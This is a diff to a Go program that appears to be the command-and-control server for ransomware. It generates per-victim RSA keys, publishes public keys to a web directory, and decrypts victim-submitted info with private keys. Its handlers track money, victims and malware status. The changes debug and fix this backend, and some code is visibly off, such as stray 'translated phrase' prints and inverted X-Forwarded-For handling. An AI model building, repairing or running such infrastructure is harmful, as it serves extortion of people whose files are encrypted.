@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha1"
@@ -51,23 +52,38 @@ type Victim struct{
 }
 
 func moveToVar( mid string)  {
-	cmd := exec.Command("cp", "/home/live/keys/"+mid+mid+"_rsa_public_key.pub"+" /var/www/html/keys/")
-	if err := cmd.Run(); err != nil {
-		log.Fatal(err)
-	}
+	fmt.Println("move to var")
+	var out bytes.Buffer
+	cmd := exec.Command("cp", "/home/live/keys/"+mid+"/"+mid+"_rsa_public_key.pub","/var/www/html/keys/")
+	cmd.Stdout = &out
+	_ = cmd.Run()
+	fmt.Printf("translated phrase: %q\n", out.String())
+	//if err := cmd.Run(); err != nil {
+	//	log.Fatal(err)
+	//}
 }
 func moveToLive( id string)  {
-	cmd1 := exec.Command("mkdir", "/home/live/keys/"+id)
-	if err := cmd1.Run(); err != nil {
-		log.Fatal(err)
-	}
+	fmt.Println("move to live")
+	keyPath := "/home/live/keys/"+id
+	var out bytes.Buffer
+	fmt.Println("keyPath : " + keyPath)
+	cmd1 := exec.Command("mkdir", keyPath)
+	cmd1.Stdout = &out
+	_ = cmd1.Run()
+	fmt.Printf("translated phrase: %q\n", out.String())
 
-	cmd2 := exec.Command("mv", "*_rsa_* /home/live/keys/"+id+"/")
-	if err := cmd2.Run(); err != nil {
-		log.Fatal(err)
-	}
+	//if err := cmd1.Run(); err != nil {
+	//	log.Fatal(err)
+	//}
+
+	cmd2 := exec.Command("mv", "*_rsa_*","/home/live/keys/"+id+"/")
+	_ = cmd2.Run()
+	//if err := cmd2.Run(); err != nil {
+	//	log.Fatal(err)
+	//}
 }
 func GenerateRSA(id int) {
+	fmt.Println("generate rsa")
 	// generate key
 	privatekey, err := rsa.GenerateKey(rand.Reader, 2048)
 	if err != nil {
@@ -298,14 +314,21 @@ func getRequested(sqlReq string,w http.ResponseWriter){
 	_ = json.NewEncoder(w).Encode(jsonized)
 }
 func CreateConfig(id int){
+	fmt.Println("createConfig")
 	idString := strconv.Itoa(id)
 	sEncId := b64.StdEncoding.EncodeToString([]byte(idString))
 	fmt.Println(sEncId)
 	err := ioutil.WriteFile(idString+"_config", []byte(sEncId), 0644)
+	fmt.Println("after file write")
 	cmd1 := exec.Command("mv", idString+"_config"+" /var/www/configs/")
-	if err := cmd1.Run(); err != nil {
-		log.Fatal(err)
-	}
+	fmt.Println("after exec")
+	_ = cmd1.Run()
+	fmt.Println("run afteri")
+
+	//if err := cmd1.Run(); err != nil {
+	//	fmt.Println("fatal yedik")
+	//	log.Fatal(err)
+	//}
 	check(err)
 }
 
@@ -324,12 +347,13 @@ func GetID(w http.ResponseWriter, r *http.Request) {
 		if err != nil {
 			panic(err.Error())
 		}
-		idString := string(Id+1)
+		var idString = strconv.Itoa(Id+1)
+		var idString2 = strconv.Itoa(Id+1)
 		CreateConfig(Id+1)
 		GenerateRSA(Id+1)
 		moveToLive(idString)
-		moveToVar(idString)
-		debugger(string(Id+1))
+		moveToVar(idString2)
+		debugger(strconv.Itoa(Id+1))
 		respond.With(w, r, http.StatusOK, Id+1)
 	}
 
@@ -546,7 +570,7 @@ func MoneyCounter(w http.ResponseWriter, r *http.Request) {
 func ReadInfoFromRSA(vicId string, infocuk string) []byte {
 
 	// Read the private key
-	pemData, err := ioutil.ReadFile("home/live/keys/"+vicId+"/"+vicId+"_rsa_private_key")
+	pemData, err := ioutil.ReadFile("/home/live/keys/"+vicId+"/"+vicId+"_rsa_private_key")
 	if err != nil {
 		log.Fatalf("read key file: %s", err)
 	}
@@ -581,8 +605,10 @@ func FirstTouch(w http.ResponseWriter, r *http.Request) {
 		id := r.FormValue("id")
 		info := r.FormValue("info")
 		postInfo := ReadInfoFromRSA(id,info)
-		fmt.Println(postInfo)
+		fmt.Println("Info: " + string(postInfo))
 		//postInfo bir json
+
+		//money-malwareStatus-Victim-IPWhois tabloları güncellenecek
 
 		ip := r.Header.Get("X-FORWARDED-FOR")
 		if ip != "" {ip = r.RemoteAddr}
